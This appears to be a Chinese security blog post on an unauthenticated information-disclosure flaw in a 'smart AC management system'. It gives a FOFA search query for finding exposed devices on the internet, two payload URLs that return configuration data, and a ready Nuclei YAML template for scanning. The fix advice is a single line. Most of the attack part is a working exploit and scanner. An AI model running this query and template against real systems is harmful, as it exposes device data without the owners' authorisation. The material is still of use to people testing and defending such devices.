@[toc]
## 免责声明
本文章仅供学习与交流，请勿用于非法用途，均由使用者本人负责，文章作者不为此承担任何责任
## 漏洞描述
智能AC管理系统是一个控制管理系统因存在未授权访问导致信息泄露
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d3e324aafb1742f4b2b08137b0bdd2bc.png)
## 搜索语法
fofa
```
header="HTTPD_ac 1.0" 
```
## 漏洞复现
payload
```
http://ip/actpt.data
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/83acbbcb71c34daf800ff2593ff92602.png)
payload
```
http://ip/actpt_5g.data
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e62f7bc6c8364717853c3cf0841f1fd3.png)
## yaml
```yaml
id: intelligent-AC-Manage-system-Information-breaches

info: 
 name: 智能AC管理系统信息泄露漏洞
 author: xl
 description: information breaches
 severity: high

http: 
  - raw: 
      - |+
         GET /actpt.data HTTP/1.1
         Host: {{Hostname}} 
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
  - raw: 
      - |+
         GET /actpt_5g.data HTTP/1.1
         Host: {{Hostname}} 
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36

matchers-condition: and
matchers: 
  - type: word
    part: body
    words: 
      - 'ap_name'
  - type: status
    status:
      - 200


```
## 修复建议
更新到最新版本
